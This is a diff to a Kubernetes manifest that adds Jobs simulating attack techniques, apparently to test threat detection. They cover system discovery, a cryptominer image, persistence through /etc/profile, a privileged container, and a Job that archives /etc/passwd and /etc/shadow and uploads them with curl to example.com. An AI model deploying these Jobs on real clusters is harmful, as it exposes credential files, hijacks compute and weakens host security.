@@ -1,7 +1,7 @@
 apiVersion: apps/v1
 kind: Deployment
 metadata:
-  name: busybox-script-runner
+  name: busybox-attack-runner
   labels:
     app: busybox-script
 spec:
@@ -105,3 +105,132 @@ spec:
                   values:
                   - busybox-script
               topologyKey: "kubernetes.io/hostname"
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: system-info-discovery
+spec:
+  template:
+    spec:
+      containers:
+      - name: system-info
+        image: busybox
+        command: ["sh", "-c", "uname -a && lscpu && df -h && cat /etc/os-release && hostname"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: network-connection-http
+spec:
+  template:
+    spec:
+      containers:
+      - name: network-connection
+        image: curlimages/curl
+        command: ["curl", "-I", "http://example.com"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: create-archive-system-logs
+spec:
+  template:
+    spec:
+      containers:
+      - name: create-archive
+        image: busybox
+        command: ["sh", "-c", "tar -czvf /tmp/system_logs.tar.gz /var/log/*"]
+        volumeMounts:
+        - name: tmp-volume
+          mountPath: /tmp
+      restartPolicy: Never
+      volumes:
+      - name: tmp-volume
+        emptyDir: {}
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: valid-accounts-access
+spec:
+  template:
+    spec:
+      containers:
+      - name: valid-accounts
+        image: busybox
+        command: ["sh", "-c", "if [ \"$(id -u)\" -eq 0 ]; then echo 'Accessing sensitive directory as root'; ls /root; else echo 'Not running as root'; fi"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: ssh-access-simulation
+spec:
+  template:
+    spec:
+      containers:
+      - name: ssh-access
+        image: busybox
+        command: ["sh", "-c", "ssh -o StrictHostKeyChecking=no user@127.0.0.1 -p 2222 'hostname && whoami'"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: cryptominer-deployment
+spec:
+  template:
+    spec:
+      containers:
+      - name: cryptominer
+        image: rkjnsn/coinhive-miner:latest
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: hijack-execution-flow
+spec:
+  template:
+    spec:
+      containers:
+      - name: hijack-script
+        image: busybox
+        command: ["sh", "-c", "echo 'echo Malicious activity detected' >> /etc/profile && source /etc/profile"]
+      restartPolicy: Never
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: unauthorized-file-access
+spec:
+  template:
+    spec:
+      containers:
+      - name: unauthorized-access
+        image: busybox
+        command: ["sh", "-c", "tar -czvf /tmp/sensitive_data.tar.gz /etc/passwd /etc/shadow && curl -T /tmp/sensitive_data.tar.gz http://example.com/upload"]
+        volumeMounts:
+        - name: tmp-volume
+          mountPath: /tmp
+      restartPolicy: Never
+      volumes:
+      - name: tmp-volume
+        emptyDir: {}
+---
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: privileged-container
+spec:
+  template:
+    spec:
+      containers:
+      - name: privileged
+        image: nginx:alpine
+        securityContext:
+          privileged: true
+      restartPolicy: Never
